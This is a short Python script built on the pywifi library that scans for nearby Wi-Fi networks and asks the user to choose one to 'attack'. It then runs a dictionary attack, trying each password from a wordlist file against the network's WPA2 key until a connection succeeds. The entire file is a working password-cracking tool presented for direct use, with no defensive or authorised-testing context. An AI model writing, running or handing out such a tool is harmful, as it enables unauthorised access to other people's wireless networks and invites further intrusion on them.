import time
import pywifi
from pywifi import const

def scan_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(3)  # wait for scan results
    results = iface.scan_results()
    networks = []
    for network in results:
        ssid = network.ssid
        if ssid not in networks:
            networks.append(ssid)
    return networks

def try_password(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(5)  # wait for connection

    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        return True
    else:
        return False

def main():
    print("Scanning for WiFi networks...")
    networks = scan_networks()
    for i, ssid in enumerate(networks):
        print(f"{i}: {ssid}")

    choice = int(input("Select the network number to attack: "))
    target_ssid = networks[choice]

    wordlist_path = input("Enter path to password wordlist file: ")

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            print(f"Trying password: {password}")
            if try_password(target_ssid, password):
                print(f"Password found: {password}")
                break
        else:
            print("Password not found in wordlist.")

if __name__ == "__main__":
    main()